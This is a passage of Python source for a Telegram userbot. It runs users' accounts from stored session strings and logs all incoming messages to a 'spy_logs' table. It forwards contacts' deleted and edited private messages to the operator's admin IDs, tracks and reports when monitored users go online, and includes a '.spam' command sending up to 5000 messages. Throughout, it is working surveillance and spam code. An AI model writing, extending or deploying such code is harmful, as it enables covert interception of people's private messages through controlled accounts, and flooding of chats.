        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    user_status_tracker[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.UserUpdate)
    async def track_status(event):
        try:
            if not hasattr(event, 'user') or event.user is None or event.user.id is None:
                return
            user = event.user
            if getattr(user, 'bot', False) or is_target_admin(user.id):
                return
            uid = user.id
            name = user.first_name or user.username or str(uid)
            cur = type(user.status).__name__
            last = user_status_tracker.get(owner_id, {}).get(uid)
            if cur != last:
                user_status_tracker[owner_id][uid] = cur
                if str(uid) in monitored_users:
                    try:
                        if isinstance(user.status, UserStatusOnline):
                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"🟢 {name} вошел в сеть!", parse_mode='HTML')
                        elif isinstance(user.status, UserStatusOffline):
                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"⚫ {name} вышел из сети!", parse_mode='HTML')
                    except:
                        pass
                if isinstance(user.status, UserStatusOnline):
                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
                elif isinstance(user.status, UserStatusOffline):
                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                else:
                    return
                cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)',
                               (datetime.now().isoformat(), uid, name[:100], status_text))
                conn.commit()
        except:
            pass
    
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if event.out:
            return
        if is_target_admin(event.sender_id):
            return
        if event.is_private and event.sender_id in muted_users:
            await event.delete()
            return
        if event.text:
            saved_messages[owner_id][event.id] = {'sender_id': event.sender_id, 'text': event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, event.id, event.sender_id, event.text, datetime.now().isoformat()))
            conn.commit()
            try:
                sender = await client.get_entity(event.sender_id)
                cursor.execute('INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id, chat_name) VALUES (?, ?, ?, ?, ?, ?)',
                              (datetime.now().isoformat(), event.sender_id, sender.first_name or str(event.sender_id), event.text[:500], event.chat_id, 'private'))
                conn.commit()
            except:
                pass
    
    @client.on(events.MessageDeleted)
    async def notify_delete(event):
        if not event.is_private:
            return
        for msg_id in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                row = cursor.fetchone()
                if row:
                    msg = {'sender_id': row[0], 'text': row[1]}
            if msg and msg['sender_id'] != owner_id and not is_target_admin(msg['sender_id']):
                try:
                    user = await client.get_entity(msg['sender_id'])
                    name = user.first_name or 'Пользователь'
                    username = f"@{user.username}" if user.username else ''
                    await send_to_admins(f"🗑 {name} {username} удалил:\n\n{msg['text'][:500]}")
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                    conn.commit()
                    if msg_id in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][msg_id]
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def notify_edit(event):
        if not event.is_private or event.out:
            return
        msg_id = event.id
        new_text = event.text or ''
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
            row = cursor.fetchone()
            if row:
                msg = {'sender_id': row[0], 'text': row[1]}
        if msg and msg['sender_id'] != owner_id and msg['text'] != new_text and not is_target_admin(msg['sender_id']):
            try:
                user = await client.get_entity(msg['sender_id'])
                name = user.first_name or 'Пользователь'
                username = f"@{user.username}" if user.username else ''
                await send_to_admins(f"✏️ {name} {username} изменил:\n\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                conn.commit()
                saved_messages[owner_id][msg_id]['text'] = new_text
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.out:
            return
        text = event.text or ''
        if not text.startswith('.'):
            return
        
        if text == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам
.type текст - печать
.info (ответ) - инфо
""", parse_mode='HTML')
            return
        
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id and not is_target_admin(reply.sender_id):
                cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)',
                              (reply.sender_id, owner_id, datetime.now().isoformat()))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit('🔇 Заглушен')
            else:
                await event.edit('❌ Ответь на сообщение')
            return
        
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit('🔊 Разглушен')
            else:
                await event.edit('❌ Ответь')
            return
        
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔇 Заглушенные:\n" + "\n".join(names))
            else:
                await event.edit("🔇 Нет")
            return
        
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = int(parts[1])
                    msg_text = parts[2] if len(parts) > 2 else None
                    if not msg_text:
                        reply = await event.get_reply_message()
                        if reply:
                            msg_text = reply.text
                    if msg_text and count > 0:
                        await event.delete()
                        for i in range(min(count, 5000)):
                            await client.send_message(event.chat_id, msg_text)
                            await asyncio.sleep(0.05)
                except:
                    pass
            return
        
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.delete()
                msg = await client.send_message(event.chat_id, txt[0])
                typed = txt[0]
                for ch in txt[1:]:
                    typed += ch
                    try:
                        await msg.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
            return
        
        if text == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    if is_target_admin(u.id):
                        await event.edit("❌ Админ")
                        return
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь')
            return
    
    await client.run_until_disconnected()

# ============================================================================
# ЗАПУСК
# ============================================================================

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        if not is_target_admin(user_id):
            asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logger.info(f"🚀 SAVEMOD ЗАПУСК | Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "event loop is already running" in str(e):
            loop = asyncio.get_event_loop()
            loop.create_task(main())
        else:
            raise
